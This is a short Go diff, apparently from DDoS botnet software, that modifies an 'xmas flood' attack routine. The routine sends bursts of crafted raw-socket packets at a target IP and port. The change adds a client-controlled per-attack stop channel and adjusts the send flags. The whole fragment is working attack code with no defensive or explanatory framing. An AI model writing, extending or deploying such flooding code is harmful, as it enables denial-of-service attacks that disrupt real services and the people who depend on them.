@@ -13,7 +13,7 @@ import (
 	"time"
 )
 
-func XmasMethod(ctx context.Context, ipaddr string, _port string) {
+func XmasMethod(ctx context.Context, ipaddr string, _port string, id int, ch chan int) {
 	defer Catch()
 
 	if config.DEBUG {
@@ -44,6 +44,14 @@ func XmasMethod(ctx context.Context, ipaddr string, _port string) {
 				fmt.Println("[xmas flood] Attack stopped")
 			}
 			return
+		case sid := <-ch:
+			if id == sid {
+				if config.DEBUG {
+					fmt.Println("[xmas flood] Attack stopped (by client)")
+				}
+				close(ch)
+				return
+			}
 		case <-utils.StopChan:
 			if config.DEBUG {
 				fmt.Println("[xmas flood] Cpu balancer")
@@ -99,6 +107,6 @@ func xmas(ip net.IP, port int) {
 	copy(addr.Addr[:4], ip)
 
 	for i := 0; i <= 20; i++ {
-		syscall.Sendto(fd, buffs, 0, &addr)
+		syscall.Sendto(fd, buffs, syscall.MSG_NOSIGNAL, &addr)
 	}
 }
